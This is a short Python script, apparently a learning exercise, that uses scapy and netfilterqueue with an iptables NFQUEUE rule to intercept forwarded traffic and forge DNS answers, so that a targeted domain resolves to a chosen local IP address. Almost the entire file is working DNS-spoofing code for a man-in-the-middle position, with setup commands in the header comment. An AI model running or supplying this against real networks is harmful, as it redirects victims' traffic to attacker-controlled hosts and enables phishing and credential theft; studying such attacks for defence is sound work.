'''
    author : zerobits01
    created: 30-Jan-2020
'''

import scapy.all as scapy
import re
import netfilterqueue

'''
    first we save the packets in a queue ans using scapy
    we access them and send or receive them :
    creating the queue is with iptables :
    > iptables -I FORWARD -j NFQUEUE --queue-num 0
    they won't be send till we want
    > pip install netfilterqueue
    # for accessing that queue
    # first we should install netfilterqueue
        i couln't so i don't upload this
    > iptables --flush # to cancel the queue
'''

def process_packet_cb(packet):
    inside_packet = packet.get_payload() # till now these are not scapy packets
    # accessing inside and modifying it
    scapy_packet = scapy.IP(inside_packet)
    if scapy_packet.haslayer(scapy.DNSRR):# response
        # first we should try to print them and then based on info we found we can change them
        if re.match(r'target\.ext',scapy_packet[scapy.DNSQR].qname):
            ip = '192.168.1.53'
            answer = scapy.DNSRR(rrname=scapy_packet[scapy.DNSQR].qname,rdata=ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # if we delete all checksums scapy will calculate automatically
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(str(scapy_packet))
    packet.accept()
    # packet.drop()

nf = netfilterqueue.NetFilterQueue()
nf.bind(0, process_packet_cb)
nf.run()